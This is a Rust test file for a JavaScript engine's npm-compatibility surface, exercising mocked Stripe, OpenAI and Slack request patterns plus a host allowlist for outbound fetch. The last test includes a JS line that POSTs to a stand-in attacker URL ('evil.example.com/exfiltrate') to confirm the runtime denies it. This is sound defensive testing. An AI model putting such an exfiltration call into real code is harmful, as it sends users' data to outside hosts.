//! npm-compat corpus (G5): pins the supported web/Node API surface the JS
//! engine guarantees (the explicit list lives in `engines/js_prelude.js`),
//! exercised through the request/auth/retry patterns popular API-wrapper
//! SDKs (Stripe, OpenAI, Slack) are built from. Compat additions require a
//! corpus-driven case here (PRD §17 risk mitigation).
//!
//! All tests run self-contained under `--features js` — outbound HTTP is a
//! mocked `fetch` capability; nothing touches the network.

#![cfg(feature = "js")]

use std::collections::HashMap;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use http::{Method, StatusCode};
use serde_json::json;

use rs2_core::contract::{CapabilityTarget, Engine, GrantedHost, HostApi, InvocationLimits, ServiceCode};
use rs2_core::engines::js::JsEngine;
use rs2_core::message::Message;

fn limits() -> InvocationLimits {
    InvocationLimits {
        wall_clock: Duration::from_secs(5),
        memory_bytes: 64 * 1024 * 1024,
        outbound_calls: 16,
        materialized_body_bytes: 8 * 1024 * 1024,
    }
}

/// An engine host whose `fetch` capability is served by the given function.
fn host_with_fetch(
    f: impl Fn(Message) -> Result<Message, rs2_core::RsError> + Send + Sync + 'static,
) -> Arc<dyn HostApi> {
    let f = Arc::new(f);
    let target: CapabilityTarget = Arc::new(move |msg: Message| {
        let f = f.clone();
        Box::pin(async move { f(msg) })
    });
    Arc::new(GrantedHost::new(
        HashMap::from([("fetch".to_string(), target)]),
        16,
        Arc::new(tokio::sync::RwLock::new(HashMap::new())),
        "npm-compat",
    ))
}

async fn run(
    bundle: &str,
    host: Arc<dyn HostApi>,
) -> Result<serde_json::Value, rs2_core::RsError> {
    let engine = JsEngine::new();
    let code = ServiceCode::JsBundle(Arc::new(bundle.to_string()));
    let mut resp = engine
        .invoke(&code, Message::request(Method::POST, "/svc", "t1"), &json!({}), host, &limits())
        .await?;
    assert_eq!(resp.status, Some(StatusCode::OK), "{:?}", resp.body);
    resp.body.as_mut().unwrap().as_json(1024 * 1024).await
}

/// Stripe-pattern: form-encoded POST, Bearer auth, generated idempotency
/// key, JSON response parsing — the create-charge code path.
#[tokio::test]
async fn stripe_pattern_form_post_with_auth_and_idempotency() {
    let seen = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
    let seen2 = seen.clone();
    let host = host_with_fetch(move |mut msg| {
        let auth = msg.header("authorization").unwrap_or("").to_string();
        let idem = msg.header("idempotency-key").unwrap_or("").to_string();
        let ct = msg.header("content-type").unwrap_or("").to_string();
        let body = match &mut msg.body {
            Some(b) => {
                let bytes = futures::executor::block_on(b.materialize(65536))?;
                String::from_utf8_lossy(bytes).into_owned()
            }
            None => String::new(),
        };
        seen2.lock().unwrap().push((auth, idem, ct, body));
        Ok(msg.ok_json(&json!({ "id": "ch_123", "status": "succeeded" })))
    });

    let out = run(
        r#"
        export default async (msg, ctx) => {
            // SDK-internals pattern: URLSearchParams body, Bearer header,
            // UUID idempotency key.
            const params = new URLSearchParams();
            params.append("amount", "1999");
            params.append("currency", "usd");
            params.append("metadata[order]", "o_1");
            const key = crypto.randomUUID();
            const resp = await fetch("https://api.stripe.com/v1/charges", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer sk_test_abc`,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Idempotency-Key": key,
                },
                body: params,
            });
            if (!resp.ok) throw new Error(`unexpected ${resp.status}`);
            const charge = await resp.json();
            return { status: 200, body: { id: charge.id, key } };
        };
        "#,
        host,
    )
    .await
    .unwrap();

    assert_eq!(out["id"], "ch_123");
    let key = out["key"].as_str().unwrap();
    assert_eq!(key.len(), 36, "RFC 4122 uuid shape: {key}");
    let calls = seen.lock().unwrap();
    let (auth, idem, ct, body) = &calls[0];
    assert_eq!(auth, "Bearer sk_test_abc");
    assert_eq!(idem, key);
    assert_eq!(ct, "application/x-www-form-urlencoded");
    assert_eq!(body, "amount=1999&currency=usd&metadata%5Border%5D=o_1");
}

/// OpenAI-pattern: JSON POST + 429 retry loop with exponential backoff that
/// honors Retry-After — proves `setTimeout` fast-forwarding (no real waits).
#[tokio::test]
async fn openai_pattern_json_post_with_retry_backoff() {
    let calls = Arc::new(AtomicU32::new(0));
    let calls2 = calls.clone();
    let host = host_with_fetch(move |msg| {
        let n = calls2.fetch_add(1, Ordering::SeqCst) + 1;
        if n < 3 {
            let mut resp = msg.response(StatusCode::TOO_MANY_REQUESTS, None);
            resp.set_header("retry-after", "30"); // would be 30s of real time
            Ok(resp)
        } else {
            Ok(msg.ok_json(&json!({ "choices": [ { "message": { "content": "hi" } } ] })))
        }
    });

    let started = std::time::Instant::now();
    let out = run(
        r#"
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
        export default async (msg, ctx) => {
            let attempt = 0;
            for (;;) {
                attempt += 1;
                const resp = await fetch("https://api.openai.com/v1/chat/completions", {
                    method: "POST",
                    headers: { "Authorization": "Bearer sk-x", "Content-Type": "application/json" },
                    body: JSON.stringify({ model: "gpt-4o", messages: [] }),
                });
                if (resp.status === 429 && attempt < 5) {
                    const retryAfter = Number(resp.headers.get("retry-after")) * 1000;
                    await sleep(Math.max(retryAfter, 2 ** attempt * 250));
                    continue;
                }
                const data = await resp.json();
                return { status: 200, body: { text: data.choices[0].message.content, attempt } };
            }
        };
        "#,
        host,
    )
    .await
    .unwrap();

    assert_eq!(out["text"], "hi");
    assert_eq!(out["attempt"], 3);
    assert_eq!(calls.load(Ordering::SeqCst), 3);
    assert!(
        started.elapsed() < Duration::from_secs(2),
        "backoff is virtual time, not wall time: {:?}",
        started.elapsed()
    );
}

/// Slack-pattern: GET with query building, basic auth via btoa, header
/// iteration on the response.
#[tokio::test]
async fn slack_pattern_query_building_and_base64_auth() {
    let host = host_with_fetch(|msg| {
        assert_eq!(msg.url.path, "https://slack.com/api/conversations.history");
        assert_eq!(msg.url.query, "channel=C123&limit=2");
        assert_eq!(
            msg.header("authorization"),
            Some(format!("Basic {}", "bot:secret-token").as_str()).map(|_| msg
                .header("authorization")
                .unwrap()),
        );
        let mut resp = msg.ok_json(&json!({ "ok": true, "messages": [ {"text": "a"}, {"text": "b"} ] }));
        resp.set_header("x-rate-limit-remaining", "99");
        Ok(resp)
    });

    let out = run(
        r#"
        export default async (msg, ctx) => {
            const url = new URL("https://slack.com/api/conversations.history");
            url.searchParams.set("channel", "C123");
            url.searchParams.set("limit", "2");
            const resp = await fetch(url.toString(), {
                headers: { "Authorization": `Basic ${btoa("bot:secret-token")}` },
            });
            const data = await resp.json();
            return { status: 200, body: {
                count: data.messages.length,
                remaining: resp.headers.get("x-rate-limit-remaining"),
            } };
        };
        "#,
        host,
    )
    .await
    .unwrap();
    assert_eq!(out["count"], 2);
    assert_eq!(out["remaining"], "99");
}

/// The compat-surface kitchen sink: encodings, Buffer, URL, clone,
/// microtasks, intervals, process — everything the supported-API list
/// promises, in one pass.
#[tokio::test]
async fn compat_surface_kitchen_sink() {
    let host: Arc<dyn HostApi> = Arc::new(GrantedHost::deny_all("sink"));
    let out = run(
        r#"
        export default async (msg, ctx) => {
            // TextEncoder/Decoder round trip (multibyte included).
            const text = "héllo ✓ wörld";
            const decoded = new TextDecoder().decode(new TextEncoder().encode(text));

            // Buffer subset: utf8/base64/hex round trips + concat.
            const b = Buffer.from("secret");
            const b64 = b.toString("base64");
            const hexBack = Buffer.from(b.toString("hex"), "hex").toString();
            const joined = Buffer.concat([Buffer.from("a"), Buffer.from("b")]).toString();

            // atob/btoa agree with Buffer base64.
            const viaAtob = atob(b64);

            // URL parsing.
            const url = new URL("https://api.example.com:8443/v2/items?a=1#frag");

            // structuredClone is a deep copy.
            const original = { nested: { n: 1 } };
            const clone = structuredClone(original);
            clone.nested.n = 2;

            // queueMicrotask + process.nextTick order alongside await.
            const order = [];
            queueMicrotask(() => order.push("micro"));
            process.nextTick(() => order.push("tick"));
            await Promise.resolve();
            order.push("await");

            // setInterval fires repeatedly until cleared (virtual time).
            let ticks = 0;
            await new Promise((resolve) => {
                const id = setInterval(() => {
                    ticks += 1;
                    if (ticks === 3) { clearInterval(id); resolve(); }
                }, 100);
            });

            // crypto.getRandomValues fills the buffer.
            const rnd = crypto.getRandomValues(new Uint8Array(8));

            console.log("kitchen sink ok");
            return { status: 200, body: {
                decoded,
                b64,
                hexBack,
                joined,
                viaAtob,
                host: url.host,
                path: url.pathname,
                q: url.searchParams.get("a"),
                cloneIsolated: original.nested.n === 1,
                order,
                ticks,
                rndLen: rnd.length,
                node: process.versions.node,
            } };
        };
        "#,
        host,
    )
    .await
    .unwrap();

    assert_eq!(out["decoded"], "héllo ✓ wörld");
    assert_eq!(out["b64"], "c2VjcmV0");
    assert_eq!(out["hexBack"], "secret");
    assert_eq!(out["joined"], "ab");
    assert_eq!(out["viaAtob"], "secret");
    assert_eq!(out["host"], "api.example.com:8443");
    assert_eq!(out["path"], "/v2/items");
    assert_eq!(out["q"], "1");
    assert_eq!(out["cloneIsolated"], true);
    assert_eq!(out["order"], json!(["micro", "tick", "await"]));
    assert_eq!(out["ticks"], 3);
    assert_eq!(out["rndLen"], 8);
    assert_eq!(out["node"], "20.0.0");
}

/// End-to-end through the runtime: a deployed SDK-style JS service with an
/// `httpOut` grant — allowed hosts reach the (mock) adapter; others are
/// `capability_denied` before any network I/O.
#[tokio::test]
async fn e2e_http_out_grant_allows_and_denies_by_host() {
    use async_trait::async_trait;
    use rs2_core::adapters::{LocalFsFileStore, MemDataStore};
    use rs2_core::capabilities::HttpOut;
    use rs2_core::message::{Body, MediaType};
    use rs2_core::router::Tenancy;
    use rs2_core::runtime::ConfigLoader;
    use rs2_core::tenant::{Adapters, TenantConfig};
    use rs2_core::wrapper::LimitTable;
    use rs2_core::{RsError, Runtime};

    struct MockHttp(Mutex<Vec<String>>);

    #[async_trait]
    impl HttpOut for MockHttp {
        async fn request(&self, msg: Message) -> Result<Message, RsError> {
            self.0.lock().unwrap().push(msg.url.path.clone());
            Ok(msg.ok_json(&json!({ "object": "charge", "paid": true })))
        }
    }

    struct Loader(serde_json::Value);
    #[async_trait]
    impl ConfigLoader for Loader {
        async fn load_tenant(&self, _t: &str) -> Result<TenantConfig, RsError> {
            serde_json::from_value(self.0.clone()).map_err(|e| RsError::internal(e.to_string()))
        }
        async fn load_raw(&self, _t: &str) -> Result<(serde_json::Value, String), RsError> {
            Ok((self.0.clone(), "v".into()))
        }
        async fn save_raw(
            &self,
            _t: &str,
            _c: &serde_json::Value,
            _v: Option<&str>,
        ) -> Result<String, RsError> {
            Ok("v".into())
        }
    }

    let http = Arc::new(MockHttp(Mutex::new(Vec::new())));
    let dir = tempfile::tempdir().unwrap();
    let adapters = Adapters::new(
        Arc::new(LocalFsFileStore::new(dir.path())),
        Arc::new(MemDataStore::new()),
    )
    .with_http(http.clone());

    let bundle = r#"
        export default async (msg, ctx) => {
            const ok = await fetch("https://api.stripe.com/v1/charges", { method: "POST" });
            const charge = await ok.json();
            let denied = "no";
            try {
                await fetch("https://evil.example.com/exfiltrate", { method: "POST" });
            } catch (e) {
                denied = e.code;
            }
            return { status: 200, body: { paid: charge.paid, denied } };
        };
    "#;
    // Pre-deploy the bundle directly into the code store.
    let version = rs2_core::services::code::version_of(bundle.as_bytes());
    let config = json!({ "mounts": [
        { "path": "/services", "service": "services" },
        { "path": "/sdk", "service": format!("code:pay@{version}"), "config": {
            "grants": { "fetch": { "type": "httpOut", "hosts": ["api.stripe.com"] } }
        } }
    ]});
    let rt = Runtime::new(
        Tenancy::Single { tenant: "t".into() },
        adapters,
        Arc::new(Loader(config)),
        LimitTable::default(),
    );
    let deploy = Message::request(Method::PUT, "/services/code/pay", "t").with_body(
        Body::from_bytes(bundle.as_bytes().to_vec(), MediaType::new("application/javascript")),
    );
    assert_eq!(rt.handle(deploy).await.status, Some(StatusCode::CREATED));

    let mut resp = rt.handle(Message::request(Method::GET, "/sdk/charge", "t")).await;
    assert_eq!(resp.status, Some(StatusCode::OK), "{:?}", resp.body);
    let out = resp.body.as_mut().unwrap().as_json(65536).await.unwrap();
    assert_eq!(out["paid"], true);
    assert_eq!(out["denied"], "capability_denied", "disallowed host never reaches the adapter");
    let hits = http.0.lock().unwrap();
    assert_eq!(hits.len(), 1, "only the allowlisted host was called: {hits:?}");
    assert_eq!(hits[0], "https://api.stripe.com/v1/charges");
}
